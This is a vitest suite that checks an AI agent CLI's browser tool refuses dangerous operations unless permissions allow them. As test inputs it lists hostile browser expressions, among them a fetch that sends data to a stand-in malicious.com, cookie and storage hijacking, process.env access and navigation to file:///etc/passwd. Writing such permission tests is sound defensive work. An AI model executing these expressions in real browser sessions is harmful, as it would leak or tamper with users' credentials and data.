/**
 * Browser Security and Dangerous Operations Permission Tests
 *
 * This test suite focuses specifically on testing security-sensitive browser
 * operations and ensuring proper permission gates are in place for:
 * 1. File system access through browser
 * 2. Network operations and cross-origin requests
 * 3. Cookie and session manipulation
 * 4. Local storage and sensitive data access
 * 5. Download operations and file handling
 * 6. JavaScript execution in sensitive contexts
 */

import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { EventEmitter } from 'eventemitter3';
import * as fs from 'fs/promises';
import * as path from 'path';
import * as os from 'os';

import { TaskStore } from '@apexcli/orchestrator';
import { BrowserTool } from '../../packages/orchestrator/src/tools/browser-tool';
import { PermissionManager } from '../../packages/orchestrator/src/permission-manager';
import { PermissionStore } from '../../packages/orchestrator/src/permission-store';
import { createTestTask, MockBrowserSession } from '../../packages/orchestrator/src/__tests__/v050-integration/test-utils';

import type {
  Task,
  PermissionLevel,
  BrowserSession,
  BrowserSessionConfig,
} from '@apexcli/core';

describe('Browser Security & Dangerous Operations Permissions', () => {
  let testDir: string;
  let taskStore: TaskStore;
  let permissionStore: PermissionStore;
  let permissionManager: PermissionManager;
  let browserTool: BrowserTool;
  let testTask: Task;
  let mockSession: MockBrowserSession;
  let securityEvents: any[] = [];

  beforeEach(async () => {
    // Create test environment
    testDir = await fs.mkdtemp(path.join(os.tmpdir(), 'apex-browser-security-test-'));

    // Initialize stores and managers
    taskStore = new TaskStore(testDir);
    await taskStore.initialize();

    permissionStore = new PermissionStore();
    permissionManager = new PermissionManager(permissionStore);

    // Create test task
    testTask = createTestTask(testDir);
    await taskStore.addTask(testTask);

    // Create browser tool with security-focused configuration
    browserTool = new BrowserTool({
      permissionManager,
      backend: 'playwright',
      engine: 'chromium',
      headless: true,
      securityMode: 'strict', // Hypothetical security mode
    });

    // Create enhanced mock browser session
    mockSession = new MockBrowserSession({
      browserType: 'chromium',
      headless: true,
      allowedDomains: ['safe.example.com', 'trusted.local'],
      blockedDomains: ['malicious.com', 'dangerous.site'],
      securityPolicy: 'strict',
    });

    // Mock browser tool to use our test session
    vi.spyOn(browserTool as any, 'createSession').mockResolvedValue(mockSession);

    // Set up security event tracking
    securityEvents = [];
    const eventEmitter = permissionStore as any as EventEmitter;

    eventEmitter.on('permission:security-violation', (event) => {
      securityEvents.push({ type: 'security-violation', ...event });
    });

    eventEmitter.on('permission:dangerous-operation', (event) => {
      securityEvents.push({ type: 'dangerous-operation', ...event });
    });

    eventEmitter.on('permission:escalation-required', (event) => {
      securityEvents.push({ type: 'escalation-required', ...event });
    });
  });

  afterEach(async () => {
    await mockSession?.close();
    await taskStore?.close();
    await fs.rm(testDir, { recursive: true, force: true });
    vi.restoreAllMocks();
  });

  describe('JavaScript Execution Security', () => {
    it('should block dangerous JavaScript execution without elevated permissions', async () => {
      // Grant basic browser permission but not dangerous execution
      await permissionManager.grantPermission('browser', 'allow-always', 'navigate');
      await browserTool.navigate({ url: 'https://safe.example.com' });

      // Attempt to execute dangerous JavaScript
      const dangerousOperations = [
        'window.location = "https://malicious.com"',
        'fetch("https://malicious.com/steal-data")',
        'localStorage.clear()',
        'document.cookie = "stolen=data"',
        'eval("malicious code")',
        'new Function("return process.env")()',
        'window.open("javascript:alert(1)")',
      ];

      for (const expression of dangerousOperations) {
        const result = await browserTool.evaluate({ expression });

        expect(result.success).toBe(false);
        expect(result.error).toMatch(/permission.*denied|dangerous.*operation|security/i);
      }

      // Verify security events were emitted
      expect(securityEvents.some(e => e.type === 'dangerous-operation')).toBe(true);
    });

    it('should allow safe JavaScript execution with basic permissions', async () => {
      await permissionManager.grantPermission('browser', 'allow-always', 'evaluate');

      // Mock safe evaluation results
      mockSession.setMockResponse('evaluate:document.title', {
        success: true,
        result: 'Page Title'
      });

      mockSession.setMockResponse('evaluate:window.innerWidth', {
        success: true,
        result: 1920
      });

      const safeOperations = [
        'document.title',
        'window.innerWidth',
        'document.querySelectorAll("h1").length',
        'window.location.hostname',
      ];

      for (const expression of safeOperations) {
        const result = await browserTool.evaluate({ expression });
        expect(result.success).toBe(true);
      }
    });

    it('should require elevated permissions for system-level JavaScript operations', async () => {
      await permissionManager.grantPermission('browser', 'allow-always', 'evaluate');

      const systemOperations = [
        'navigator.geolocation.getCurrentPosition',
        'navigator.mediaDevices.getUserMedia',
        'window.postMessage',
        'window.parent.postMessage',
        'frames[0].location',
      ];

      for (const expression of systemOperations) {
        const result = await browserTool.evaluate({ expression });

        expect(result.success).toBe(false);
        expect(result.error).toMatch(/permission.*denied|elevated.*permission|system.*access/i);
      }

      expect(securityEvents.some(e =>
        e.type === 'escalation-required' && e.scope === 'system-access'
      )).toBe(true);
    });
  });

  describe('File System Access Through Browser', () => {
    it('should block file upload operations without file permissions', async () => {
      await permissionManager.grantPermission('browser', 'allow-always');
      await browserTool.navigate({ url: 'https://safe.example.com' });

      // Mock file input interaction
      mockSession.setMockResponse('type:input[type="file"]', {
        success: false,
        error: 'File access requires elevated permissions'
      });

      const result = await browserTool.type({
        selector: 'input[type="file"]',
        text: '/path/to/sensitive/document.pdf',
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/file.*permission|access.*denied/i);
    });

    it('should block download operations without download permissions', async () => {
      await permissionManager.grantPermission('browser', 'allow-always');
      await browserTool.navigate({ url: 'https://safe.example.com' });

      // Mock download trigger
      mockSession.setMockResponse('click:a[download]', {
        success: false,
        error: 'Download operations require elevated permissions'
      });

      const result = await browserTool.click({
        selector: 'a[download="sensitive-data.zip"]',
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/download.*permission|file.*access/i);
    });

    it('should allow file operations with proper elevated permissions', async () => {
      await permissionManager.grantPermission('browser', 'allow-always', 'file-access');

      // Mock successful file operations
      mockSession.setMockResponse('type:input[type="file"]', {
        success: true,
        element: 'input[type="file"]'
      });

      const result = await browserTool.type({
        selector: 'input[type="file"]',
        text: '/path/to/approved/file.txt',
      });

      expect(result.success).toBe(true);
    });
  });

  describe('Network Operations and Cross-Origin Security', () => {
    it('should block navigation to untrusted domains', async () => {
      await permissionManager.grantPermission('browser', 'allow-always');

      const untrustedUrls = [
        'https://malicious.com',
        'https://suspicious-domain.net',
        'http://insecure-site.com',
        'file:///etc/passwd',
        'data:text/html,<script>alert(1)</script>',
      ];

      for (const url of untrustedUrls) {
        const result = await browserTool.navigate({ url });

        expect(result.success).toBe(false);
        expect(result.error).toMatch(/blocked|untrusted|security.*policy/i);
      }

      expect(securityEvents.some(e => e.type === 'security-violation')).toBe(true);
    });

    it('should require network permissions for external resource access', async () => {
      await permissionManager.grantPermission('browser', 'allow-always', 'navigate');
      await browserTool.navigate({ url: 'https://safe.example.com' });

      // Mock fetch operation
      const result = await browserTool.evaluate({
        expression: 'fetch("https://api.external.com/data")',
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/network.*permission|external.*access/i);
    });

    it('should allow trusted domain navigation with proper permissions', async () => {
      await permissionManager.grantPermission('browser', 'allow-always');

      const trustedUrls = [
        'https://safe.example.com',
        'https://trusted.local',
        'https://api.safe.example.com',
      ];

      for (const url of trustedUrls) {
        const result = await browserTool.navigate({ url });
        expect(result.success).toBe(true);
      }
    });
  });

  describe('Cookie and Session Security', () => {
    it('should block sensitive cookie operations without permission', async () => {
      await permissionManager.grantPermission('browser', 'allow-always', 'evaluate');
      await browserTool.navigate({ url: 'https://safe.example.com' });

      const sensitiveOperations = [
        'document.cookie = "session=hijacked"',
        'localStorage.setItem("auth", "stolen")',
        'sessionStorage.clear()',
        'document.cookie = ""; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;',
      ];

      for (const expression of sensitiveOperations) {
        const result = await browserTool.evaluate({ expression });

        expect(result.success).toBe(false);
        expect(result.error).toMatch(/permission.*denied|cookie.*access|storage.*access/i);
      }
    });

    it('should allow safe cookie reading with proper permissions', async () => {
      await permissionManager.grantPermission('browser', 'allow-always', 'cookie-read');

      mockSession.setMockResponse('evaluate:document.cookie', {
        success: true,
        result: 'theme=dark; lang=en'
      });

      const result = await browserTool.evaluate({
        expression: 'document.cookie',
      });

      expect(result.success).toBe(true);
      expect(result.result).toBe('theme=dark; lang=en');
    });

    it('should require elevated permissions for session manipulation', async () => {
      await permissionManager.grantPermission('browser', 'allow-always', 'cookie-read');

      const result = await browserTool.evaluate({
        expression: 'sessionStorage.setItem("admin", "true")',
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/session.*manipulation|elevated.*permission/i);
    });
  });

  describe('Form Security and Data Submission', () => {
    it('should block sensitive form submissions without permission', async () => {
      await permissionManager.grantPermission('browser', 'allow-always');
      await browserTool.navigate({ url: 'https://safe.example.com' });

      // Mock sensitive form submission
      mockSession.setMockResponse('submit:#payment-form', {
        success: false,
        error: 'Sensitive form submission requires elevated permissions'
      });

      const result = await browserTool.submit({
        selector: '#payment-form',
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/permission.*denied|sensitive.*form|payment/i);
    });

    it('should require confirmation for credential forms', async () => {
      await permissionManager.grantPermission('browser', 'allow-always');
      await browserTool.navigate({ url: 'https://safe.example.com/login' });

      // Mock credential form interaction
      const result = await browserTool.type({
        selector: 'input[type="password"]',
        text: 'user-password',
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/credential.*form|password.*field|confirmation.*required/i);
    });

    it('should allow safe form interactions with proper permissions', async () => {
      await permissionManager.grantPermission('browser', 'allow-always', 'form-submit');

      const result = await browserTool.submit({
        selector: '#search-form',
      });

      expect(result.success).toBe(true);
    });
  });

  describe('Screenshot and Visual Data Security', () => {
    it('should block screenshots of sensitive pages without permission', async () => {
      await permissionManager.grantPermission('browser', 'allow-always', 'navigate');
      await browserTool.navigate({ url: 'https://safe.example.com/admin' });

      // Mock sensitive page detection
      mockSession.setMockResponse('screenshot', {
        success: false,
        error: 'Screenshot of sensitive page requires elevated permissions'
      });

      const result = await browserTool.screenshot();

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/sensitive.*page|screenshot.*permission|visual.*data/i);
    });

    it('should require explicit permission for full page screenshots', async () => {
      await permissionManager.grantPermission('browser', 'allow-always', 'screenshot-viewport');

      // Full page screenshot should require different permission
      const result = await browserTool.screenshot({
        fullPage: true,
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/full.*page|elevated.*permission/i);
    });

    it('should allow safe screenshots with proper permissions', async () => {
      await permissionManager.grantPermission('browser', 'allow-always', 'screenshot');

      const result = await browserTool.screenshot();

      expect(result.success).toBe(true);
      expect(result.path).toBeDefined();
    });
  });

  describe('Permission Escalation Workflows', () => {
    it('should handle step-by-step permission escalation', async () => {
      // Start with basic navigation
      await permissionManager.grantPermission('browser', 'allow-always', 'navigate');

      const navResult = await browserTool.navigate({ url: 'https://safe.example.com' });
      expect(navResult.success).toBe(true);

      // Request screenshot permission
      const screenshotResult1 = await browserTool.screenshot();
      expect(screenshotResult1.success).toBe(false);

      // Grant screenshot permission
      await permissionManager.grantPermission('browser', 'allow-always', 'screenshot');

      const screenshotResult2 = await browserTool.screenshot();
      expect(screenshotResult2.success).toBe(true);

      // Verify escalation was tracked
      expect(securityEvents.some(e => e.type === 'escalation-required')).toBe(true);
    });

    it('should handle permission downgrade requests', async () => {
      // Start with full permissions
      await permissionManager.grantPermission('browser', 'allow-always');

      // Downgrade to read-only mode
      await permissionManager.denyPermission('browser', 'submit');
      await permissionManager.denyPermission('browser', 'evaluate');

      // Read operations should still work
      const getTextResult = await browserTool.getText({ selector: 'h1' });
      expect(getTextResult.success).toBe(true);

      // Write operations should fail
      const submitResult = await browserTool.submit({ selector: '#form' });
      expect(submitResult.success).toBe(false);
    });

    it('should handle conditional permission based on content', async () => {
      await permissionManager.grantPermission('browser', 'allow-always', 'navigate');
      await browserTool.navigate({ url: 'https://safe.example.com' });

      // Mock content-based permission check
      mockSession.setMockResponse('getText:title', {
        success: true,
        text: 'Administrative Panel'
      });

      const titleText = await browserTool.getText({ selector: 'title' });

      // If page contains sensitive content, additional permissions required
      if (titleText.text?.includes('Admin')) {
        const screenshotResult = await browserTool.screenshot();
        expect(screenshotResult.success).toBe(false);
        expect(screenshotResult.error).toMatch(/admin.*page|sensitive.*content/i);
      }
    });
  });

  describe('Security Policy Enforcement', () => {
    it('should enforce Content Security Policy restrictions', async () => {
      await permissionManager.grantPermission('browser', 'allow-always', 'evaluate');
      await browserTool.navigate({ url: 'https://safe.example.com' });

      // Mock CSP violation
      const result = await browserTool.evaluate({
        expression: 'eval("inline script")',
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/csp.*violation|content.*security.*policy|inline.*script/i);
    });

    it('should respect browser security headers', async () => {
      // Mock navigation to site with strict security headers
      mockSession.setMockResponse('navigate:https://secure.example.com', {
        success: false,
        error: 'Site blocks automation due to security headers'
      });

      await permissionManager.grantPermission('browser', 'allow-always');

      const result = await browserTool.navigate({
        url: 'https://secure.example.com',
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/security.*headers|automation.*blocked/i);
    });

    it('should handle mixed content security policies', async () => {
      await permissionManager.grantPermission('browser', 'allow-always');

      // Navigate to HTTPS site
      await browserTool.navigate({ url: 'https://safe.example.com' });

      // Attempt to load HTTP resource
      const result = await browserTool.evaluate({
        expression: 'fetch("http://insecure.example.com/api")',
      });

      expect(result.success).toBe(false);
      expect(result.error).toMatch(/mixed.*content|insecure.*resource|https.*http/i);
    });
  });

  describe('Audit and Compliance', () => {
    it('should maintain detailed audit trail for security decisions', async () => {
      await permissionManager.grantPermission('browser', 'allow-always', 'navigate');

      // Perform operations that require security decisions
      await browserTool.navigate({ url: 'https://safe.example.com' });
      await browserTool.screenshot();
      await browserTool.evaluate({ expression: 'document.title' });

      // Verify all security decisions were logged
      expect(securityEvents.length).toBeGreaterThan(0);

      const auditTrail = securityEvents.map(event => ({
        timestamp: event.timestamp,
        operation: event.operation,
        decision: event.decision,
        reason: event.reason,
      }));

      expect(auditTrail.length).toBeGreaterThan(0);

      // Verify audit data completeness
      auditTrail.forEach(entry => {
        expect(entry.timestamp).toBeDefined();
        expect(entry.operation).toBeDefined();
        expect(entry.decision).toMatch(/allow|deny|escalate/);
      });
    });

    it('should generate security compliance report', async () => {
      await permissionManager.grantPermission('browser', 'allow-always');

      // Perform various operations
      const operations = [
        browserTool.navigate({ url: 'https://safe.example.com' }),
        browserTool.screenshot(),
        browserTool.getText({ selector: 'h1' }),
        browserTool.click({ selector: '#safe-button' }),
      ];

      await Promise.allSettled(operations);

      // Generate compliance summary
      const complianceReport = {
        totalOperations: operations.length,
        securityViolations: securityEvents.filter(e => e.type === 'security-violation').length,
        escalationRequests: securityEvents.filter(e => e.type === 'escalation-required').length,
        dangerousOperations: securityEvents.filter(e => e.type === 'dangerous-operation').length,
      };

      expect(complianceReport.totalOperations).toBe(operations.length);
      expect(complianceReport).toMatchObject({
        totalOperations: expect.any(Number),
        securityViolations: expect.any(Number),
        escalationRequests: expect.any(Number),
        dangerousOperations: expect.any(Number),
      });
    });
  });
});